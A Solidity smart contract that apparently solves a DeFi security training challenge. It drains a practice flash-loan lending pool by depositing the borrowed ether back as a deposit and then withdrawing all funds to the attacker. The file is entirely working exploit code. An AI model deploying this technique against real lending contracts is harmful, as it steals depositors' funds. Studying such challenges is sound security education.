// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";


contract ExploitSideEntrance {
    using Address for address;
    using Address for address payable;

    // Receiver needs to know the pool it is receiving from
    SideEntranceLenderPool private immutable pool;
    address private immutable pool_address;

    // attacker
    address private immutable owner;

    constructor(address payable poolAddress) {
        pool_address = poolAddress;
        pool = SideEntranceLenderPool(poolAddress);
        owner = msg.sender;
    }

    // arbitrary function
    //https://swcregistry.io/docs/SWC-104
    function execute() external payable {
        // make a deposit with the loaned amount
        pool_address.functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            msg.value
        );

        // which will also satisfy repaying the loan
    }

    function exploit() public payable {
        // this will call the execute routine above
        pool.flashLoan((pool_address.balance));

        // withdraw all the funds
        pool.withdraw();
    }

    receive () external payable {
        uint256 amountToWithdraw = address(this).balance;
        payable(owner).sendValue(amountToWithdraw);
    }
}